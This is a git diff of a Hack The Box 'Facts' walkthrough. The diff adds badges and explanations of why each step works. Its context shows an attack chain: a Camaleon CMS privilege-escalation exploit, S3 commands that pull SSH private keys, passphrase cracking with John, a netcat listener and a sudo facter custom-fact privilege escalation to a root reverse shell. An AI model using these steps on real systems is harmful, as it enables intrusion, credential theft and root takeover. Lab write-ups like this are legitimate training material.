@@ -1,4 +1,19 @@
 # HTB Walkthrough — Facts
+
+<p align="center">
+  <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bdcd209c32f156fbfb2268f099971f75.png" alt="HTB Facts Machine" width="220" />
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Nmap-Scan-blue" alt="Nmap" />
+  <img src="https://img.shields.io/badge/Gobuster-Dir%20Enum-orange" alt="Gobuster" />
+  <img src="https://img.shields.io/badge/AWS%20CLI-Endpoint%2054321-yellow" alt="AWS CLI" />
+  <img src="https://img.shields.io/badge/John%20the%20Ripper-SSH%20Crack-red" alt="John the Ripper" />
+  <img src="https://img.shields.io/badge/OpenSSH-Key%20Auth-green" alt="OpenSSH" />
+  <img src="https://img.shields.io/badge/Facter-PrivEsc-purple" alt="Facter" />
+  <img src="https://img.shields.io/badge/Camaleon%20CMS-CVE--2025--2304-black" alt="Camaleon CMS" />
+</p>
+
 - **Author**: ElJoamy
 - **Machine**: Facts
 - **Machine URL**: https://app.hackthebox.com/machines/Facts
@@ -17,6 +32,10 @@
 nmap -sV -sC 10.129.244.96 -oN nmap.txt
 ```
 
+**Why these flags matter:**
+- `-sV` fingerprints running services to identify versions and potential CVEs.
+- `-sC` runs default NSE scripts (auth checks, SSL info, HTTP redirects), giving fast, safe baseline insights.
+
 **Key results:**
 ```
 PORT   STATE SERVICE VERSION
@@ -29,6 +48,7 @@ PORT   STATE SERVICE VERSION
 **Notes:**
 - Open ports: 22 (SSH), 80 (HTTP).
 - Virtual host redirect to facts.htb.
+- The HTTP title revealing a vhost indicates name-based routing; mapping facts.htb locally is required to resolve correctly.
 
 **Add host entry:**
 ```
@@ -49,11 +69,13 @@ admin (302) [--> http://facts.htb/admin/login]
 ...
 ```
 
+**Why this wordlist:** The “lowercase 2.3 medium” list helps on Linux web roots that commonly use lowercase paths and gives a good speed/coverage tradeoff. A 302 to `/admin/login` confirms an admin panel with an authentication flow worth testing.
+
 **Visit /admin/login and create an account:**
 - Username: test
 - Password: test
 
-- **After login, role**: client. **Dashboard shows:**
+**After login, role**: client. **Dashboard shows:**
 ```
 Camaleon CMS v2.9.0
 ```
@@ -62,6 +84,8 @@ Camaleon CMS v2.9.0
 **Reference**: https://github.com/Alien0ne/CVE-2025-2304
 
 This exploit lets an authenticated **client** escalate privileges, change other users’ passwords, and extract **AWS** secrets.
+
+**Root cause (high level):** Improper authorization checks in Camaleon CMS allow actions reserved for admins (e.g., role updates, secret retrieval) to be triggered by a non-admin session.
 
 **Run:**
 ```bash
@@ -110,6 +134,8 @@ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 id
 aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys authorized_keys
 ```
 
+**Why the endpoint URL:** The service likely uses a local S3-compatible storage (e.g., MinIO) exposed on port 54321. The AWS CLI needs `--endpoint-url` to talk to non-AWS S3 implementations.
+
 ## **Key Cracking and SSH**
 **Format the private key for cracking:**
 ```bash
@@ -122,6 +148,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
 chmod 600 id_ed25519
 ssh-keygen -y -f id_ed25519
 ```
+
+**Why these steps:** SSH enforces strict permissions (`chmod 600`) on private keys. `ssh2john.py` converts SSH private keys into a hash format so John can attempt passphrase cracking if the key is protected.
 
 **SSH in:**
 ```bash
@@ -139,6 +167,8 @@ sudo -l
 ```
 
 We can run **facter** as **root** without a password.
+
+**What this means:** A `NOPASSWD` sudoers entry allows the user to execute the listed binary as root without authentication. If that binary loads user-controlled code (plugins, custom scripts), it can often be leveraged for privilege escalation.
 
 ## **PrivEsc to root using facter (custom fact)**
 **Create a malicious custom fact:**
@@ -159,6 +189,8 @@ nc -nlvp 4444
 ```bash
 sudo /usr/bin/facter --custom-dir /tmp
 ```
+
+**Why it works:** `facter` (Ruby-based) supports loading custom facts from a directory. Run via sudo, any commands executed by those facts inherit root privileges, allowing a root shell via a reverse connection.
 
 **Verify root:**
 ```bash
